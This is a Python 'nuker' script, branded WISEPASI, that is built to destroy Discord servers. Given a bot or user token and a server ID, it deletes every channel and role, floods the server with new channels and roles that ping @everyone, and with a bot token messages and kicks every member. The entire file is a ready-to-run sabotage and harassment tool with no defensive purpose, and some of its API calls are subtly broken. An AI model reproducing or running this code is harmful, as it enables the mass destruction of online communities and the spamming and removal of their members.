

import pyfiglet

import httpx, time

text = pyfiglet.print_figlet(text="WISEPASI",
colors="BLUE")

class nuker:
    def __init__(self):
        self.session = httpx.Client()
        self.token = input("Whats your bot token: ")
        self.checkToken()
        self.guildID = int(input("Enter the server id: "))
        self.amount = int(input("How many channels/roles to create: "))
        self.name = input("channels/roles name: ")
        self.message = input("Message to dm all: ")
        
    def checkToken(self):  # sourcery skip: raise-specific-error
        self.session.headers= { "Authorization": self.token }
        r = self.session.get('https://discord.com/api/v10/users/@me')
        if r.status_code in list(range(200,300)):
            self.isBot = False
        else:
            self.session.headers= { "Authorization": f"Bot {self.token}" }
            r = self.session.get('https://discord.com/api/v10/users/@me')
            if r.status_code in list(range(200,300)):
                self.isBot = True
            else:
                raise Exception("Invalid Token ")

    
    def deleteChannels(self):
        channels = self.session.get(f'https://discord.com/api/guilds/{self.guildID}/channels').json()
        for channel in channels:
            r = self.session.delete(f'https://discord.com/api/v9/channels/{channel["id"]}')
            if r.status_code in list(range(200,300)):
                print(f"successfully deleted channel {channel['name']}")
            else:
                print(f"failed to delete channel {channel['name']}")
            time.sleep(0.15)
            
    def deleteRoles(self):
        roles = self.session.get(f'https://discord.com/api/guilds/{self.guildID}/roles').json()
        for role in roles:
            r = self.session.delete(f'https://discord.com/api/v9/guilds/{self.guildID}/roles/{role["id"]}')
            if r.status_code in list(range(200,300)):
                print(f"successfully deleted role {role['name']}")
            else:
                print(f"failed to delete role {role['name']}")
            time.sleep(0.15)
            
    def createChannelsRoles(self):
        for _ in range(self.amount):
            r = self.session.post(f'https://discord.com/api/v9/guilds/{self.guildID}/channels',json={"type":0,"name":self.name,"permission_overwrites":[]})
            time.sleep(0.15)
            if r.status_code in list(range(200,300)):
                print(f"successfully created channel {self.name}")
                self.session.post(f'https://discord.com/api/v9/channels/{r.json()["id"]}/messages',json={"content":f'@everyone {self.name}',"tts":False})
            else:
                print("cant create channel")
            time.sleep(0.15)
            r = self.session.post(f'https://discord.com/api/v9/guilds/{self.guildID}/roles',json={"name":self.name})
            if r.status_code in list(range(200,300)):
                print(f"successfully created role {self.name}")
            else:
                print("cant create role")
            time.sleep(0.15)
    
    def DMkickAll(self):
        members=self.session.get(f'https://discord.com/api/v9/guilds/{self.guildID}/members').json()
        for member in members:
            m=self.session.post('https://discord.com/api/v9/users/@me/channels',json={"recipients":[member["id"],]}).json()
            self.session.post(f'https://discord.com/api/v9/channels/{member["id"]}/messages',json={"content":f"@everyone {self.message}","tts":False})
            self.session.delete(f'https://discord.com/api/v9/guilds/{self.guildID}/members/{member["id"]}')
            print(f"dm and kicked {member['name']}#{member['discriminator']}")
            
    
    def nuke(self):
        self.deleteChannels()
        self.deleteRoles()
        self.createChannelsRoles()
        if self.isBot:
            self.DMkickAll()
        else:
            print("cant kick/dm all with user account (bot account required) just do it manually for safety reasons fr")
        
        

nuker().nuke()
